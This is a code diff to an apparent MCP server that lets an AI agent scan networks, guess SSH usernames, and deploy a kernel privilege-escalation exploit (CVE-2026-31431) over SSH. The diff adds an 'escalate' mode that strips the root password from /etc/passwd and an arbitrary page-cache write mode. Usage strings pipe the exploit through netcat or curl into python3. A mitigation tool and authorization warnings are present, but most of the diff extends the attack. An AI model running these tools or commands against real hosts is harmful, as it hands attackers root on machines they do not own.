@@ -10,7 +10,7 @@ from fastmcp import FastMCP
 
 from .checker import EXPLOIT_SCRIPT, apply_mitigation, assess, check_kernel, run_exploit
 from .scanner import scan_subnet
-from .ssh_client import SSHClient
+from .ssh_client import SSHClient, resolve_users
 
 logger = logging.getLogger(__name__)
 
@@ -31,17 +31,18 @@ def _warn() -> str:
 
 @mcp.tool()
 async def cf_get_exploit_script() -> dict:
-    """Get the raw CVE-2026-31431 PoC script.
+    """Get the raw CVE-2026-31431 PoC script (multi-target).
 
-    Returns the 732-byte Python exploit as text. Pipe this over any channel
+    Returns the Python exploit as text. Pipe this over any channel
     (netcat, web shell, curl pipe, etc.) to a target that has Python 3.10+
     but no SSH access to this MCP server.
 
-    Usage over netcat:
-      copy-fail-mcp tool cf_get_exploit_script | nc target 8080 | python3
+    Supports multiple attack targets:
+      - escalate  : patch /etc/passwd, remove root password
+      - write     : arbitrary page-cache write (use 'write <file> <off> <data>')
 
-    Usage over a web shell:
-      curl -s http://your-mcp-server:10909/exploit | python3
+    Usage over netcat:
+      copy-fail-mcp tool cf_get_exploit_script | nc target 8080 | python3 - escalate
 
     WARNING: This is the actual LPE exploit. Running it on a vulnerable
     system will give you root. Ensure you have authorization.
@@ -51,11 +52,12 @@ async def cf_get_exploit_script() -> dict:
         "warning": _warn(),
         "script": EXPLOIT_SCRIPT,
         "size_bytes": len(EXPLOIT_SCRIPT),
+            "sha256": "79db95935596aac01ba525001f8cbaf4dced6c6b3eefae202e7f0bd20ee5e1e8",
         "python_version": "3.10+ (stdlib only)",
+        "targets": ["escalate", "write"],
         "usage": [
-            "Save to file: echo '<script>' > /tmp/exp.py && python3 /tmp/exp.py",
-            "Pipe direct: python3 -c 'import urllib.request; exec(urllib.request.urlopen(\"http://MCP-SERVER/exploit\").read())'",
-            "netcat: nc ATTACKER_IP PORT | python3",
+            "Patch passwd: echo '<script>' > /tmp/exp.py && python3 /tmp/exp.py escalate",
+            "Pipe direct: curl -s http://MCP-SERVER/exploit | python3 - escalate",
         ],
     }
 
@@ -88,11 +90,13 @@ async def cf_exploit_local(
             "status": "ok",
             "path": target_path,
             "size_bytes": len(EXPLOIT_SCRIPT),
+"sha256": "79db95935596aac01ba525001f8cbaf4dced6c6b3eefae202e7f0bd20ee5e1e8",
             "warning": _warn(),
+            "targets": ["escalate", "write"],
             "instructions": [
                 f"Script written to {target_path}",
-                "Run it: python3 {target_path}",
-                "Or if being piped: cat {target_path} | python3",
+                "Patch passwd: python3 {target_path} escalate",
+                "Custom write: python3 {target_path} write <file> <offset> <data>",
             ],
         }
     except Exception as e:
@@ -141,7 +145,7 @@ async def cf_detect_local_wsl() -> dict:
                 ip = stdout2.decode().strip().split()[0] if stdout2.decode().strip() else ""
                 if ip:
                     wsl_hosts.append({"distro": distro, "ip": ip, "port": 22})
-            except Exception as e:
+            except Exception:
                 pass  # skip distros that fail
 
         # Also check localhost (WSL2 port forwarding)
@@ -206,40 +210,90 @@ async def cf_scan_network(
         return {"status": "error", "error": str(e)}
 
 
+async def _connect_ssh(
+    host: str,
+    port: int,
+    username: str,
+    auto_user: bool,
+    banner_hint: str | None,
+    timeout: float,
+) -> tuple[SSHClient, bool, str | None]:
+    """Connect via SSH, optionally auto-detecting the username.
+
+    Returns (client, connected, connected_user).
+    Auto-mode iterates common distro usernames until one works.
+    """
+    ssh = SSHClient(host=host, port=port, username=username, timeout=timeout)
+
+    if auto_user:
+        ok, user = await ssh.try_connect_chain(banner_hint=banner_hint)
+        return ssh, ok, user
+    else:
+        ok = await ssh.connect()
+        return ssh, ok, username if ok else None
+
+
+def _connect_error(
+    host: str,
+    port: int,
+    username: str,
+    auto_user: bool,
+    connected_user: str | None,
+) -> dict:
+    if auto_user:
+        candidates = resolve_users()
+        return {
+            "status": "error",
+            "error": f"Could not connect to {host}:{port} with any common username",
+            "tried": candidates[:8],
+            "note": "Try explicit --username or check SSH agent keys",
+        }
+    return {
+        "status": "error",
+        "error": f"Failed to connect to {username}@{host}:{port}",
+        "note": "Ensure SSH agent is running and key is added",
+    }
+
+
 @mcp.tool()
 async def cf_check_target(
     host: str,
-    username: str = "root",
+    username: str = "ubuntu",
     port: int = 22,
     timeout: float = DEFAULT_SSH_TIMEOUT,
+    auto_user: bool = False,
+    banner_hint: str | None = None,
 ) -> dict:
     """Check a remote Linux host for CVE-2026-31431 vulnerability.
 
     Connects via SSH agent forwarding, checks kernel version,
     CONFIG_CRYPTO_USER_API_AEAD status, and distro patch status.
 
+    Use auto_user=True to try common distro usernames automatically.
+    Pass banner_hint from cf_scan_network's os_hint for smarter ordering.
+
     Args:
         host: Target hostname or IP.
         username: SSH user (must have agent access).
         port: SSH port (default: 22).
         timeout: SSH connection timeout in seconds.
+        auto_user: Try common usernames automatically.
+        banner_hint: SSH banner text from scan (e.g. os_hint field).
 
     Returns:
         Kernel version, vulnerability status, mitigation info.
     """
-    ssh = SSHClient(host=host, port=port, username=username, timeout=timeout)
-    connected = await ssh.connect()
+    ssh, connected, connected_user = await _connect_ssh(
+        host, port, username, auto_user, banner_hint, timeout,
+    )
     if not connected:
-        return {
-            "status": "error",
-            "error": f"Failed to connect to {username}@{host}:{port}",
-            "note": "Ensure SSH agent is running and key is added",
-        }
+        return _connect_error(host, port, username, auto_user, connected_user)
 
     try:
         result = await check_kernel(ssh)
         if result["status"] == "ok":
             result["warning"] = _warn()
+            result["connected_user"] = connected_user
         return result
     finally:
         await ssh.close()
@@ -248,37 +302,50 @@ async def cf_check_target(
 @mcp.tool()
 async def cf_run_exploit(
     host: str,
-    username: str = "root",
+    username: str = "ubuntu",
     port: int = 22,
+    target: str = "escalate",
     timeout: float = DEFAULT_SSH_TIMEOUT,
     cleanup: bool = True,
+    auto_user: bool = False,
+    banner_hint: str | None = None,
 ) -> dict:
     """Run the Copy Fail PoC on a target Linux host.
 
     WARNING: This deploys and executes the actual LPE exploit.
     Target must be vulnerable (confirmed via cf_check_target first).
 
-    The exploit corrupts /usr/bin/su in page cache to gain root.
-    After success, you will have a root shell.
+    Attack targets:
+      - "escalate" : patch /etc/passwd, remove root password (default)
+      - "write"    : arbitrary page-cache write (use extra_args)
+
+    After success with escalate, run 'su root' for a passwordless root shell.
+
+    Use auto_user=True to try common distro usernames automatically.
 
     Args:
         host: Target hostname or IP.
         username: SSH user.
         port: SSH port.
+        target: Attack target (escalate or write).
         timeout: SSH timeout.
         cleanup: Remove exploit script after run.
+        auto_user: Try common usernames automatically.
+        banner_hint: SSH banner text from scan.
 
     Returns:
         Whether root was obtained and full command output.
     """
-    ssh = SSHClient(host=host, port=port, username=username, timeout=timeout)
-    connected = await ssh.connect()
+    ssh, connected, connected_user = await _connect_ssh(
+        host, port, username, auto_user, banner_hint, timeout,
+    )
     if not connected:
         return {"status": "error", "error": "SSH connection failed", "warning": _warn()}
 
     try:
-        result = await run_exploit(ssh, cleanup=cleanup)
+        result = await run_exploit(ssh, target=target, cleanup=cleanup)
         result["warning"] = _warn()
+        result["connected_user"] = connected_user
         return result
     finally:
         await ssh.close()
@@ -287,10 +354,12 @@ async def cf_run_exploit(
 @mcp.tool()
 async def cf_apply_mitigation(
     host: str,
-    username: str = "root",
+    username: str = "ubuntu",
     port: int = 22,
     timeout: float = DEFAULT_SSH_TIMEOUT,
     dry_run: bool = True,
+    auto_user: bool = False,
+    banner_hint: str | None = None,
 ) -> dict:
     """Apply mitigation for CVE-2026-31431 on a target host.
 
@@ -306,18 +375,22 @@ async def cf_apply_mitigation(
         port: SSH port.
         timeout: SSH connection timeout.
         dry_run: If True, only show commands without executing.
+        auto_user: Try common usernames automatically.
+        banner_hint: SSH banner text from scan.
 
     Returns:
         Mitigation status, commands run, reboot required flag.
     """
-    ssh = SSHClient(host=host, port=port, username=username, timeout=timeout)
-    connected = await ssh.connect()
+    ssh, connected, connected_user = await _connect_ssh(
+        host, port, username, auto_user, banner_hint, timeout,
+    )
     if not connected:
         return {"status": "error", "error": "SSH connection failed", "warning": _warn()}
 
     try:
         result = await apply_mitigation(ssh, dry_run=dry_run)
         result["warning"] = _warn()
+        result["connected_user"] = connected_user
         return result
     finally:
         await ssh.close()
@@ -326,36 +399,46 @@ async def cf_apply_mitigation(
 @mcp.tool()
 async def cf_assess(
     host: str,
-    username: str = "root",
+    username: str = "ubuntu",
     port: int = 22,
+    target: str = "escalate",
     timeout: float = DEFAULT_SSH_TIMEOUT,
     force: bool = False,
     cleanup: bool = True,
+    auto_user: bool = False,
+    banner_hint: str | None = None,
 ) -> dict:
     """Full assessment: check + optionally exploit a Linux host.
 
     Checks kernel version first. If vulnerable and not patched,
     runs the exploit automatically. Use force=True to override.
 
+    Use auto_user=True to try common distro usernames automatically.
+
     Args:
         host: Target hostname or IP.
         username: SSH user.
         port: SSH port.
+        target: Attack target (escalate or write).
         timeout: SSH connection timeout.
         force: Run exploit even if kernel appears non-vulnerable.
         cleanup: Remove exploit script after run.
+        auto_user: Try common usernames automatically.
+        banner_hint: SSH banner text from scan.
 
     Returns:
         Full assessment with kernel info and exploit result.
     """
-    ssh = SSHClient(host=host, port=port, username=username, timeout=timeout)
-    connected = await ssh.connect()
+    ssh, connected, connected_user = await _connect_ssh(
+        host, port, username, auto_user, banner_hint, timeout,
+    )
     if not connected:
         return {"status": "error", "error": "SSH connection failed", "warning": _warn()}
 
     try:
-        result = await assess(ssh, force=force, cleanup=cleanup)
+        result = await assess(ssh, target=target, force=force, cleanup=cleanup)
         result["warning"] = _warn()
+        result["connected_user"] = connected_user
         return result
     finally:
         await ssh.close()
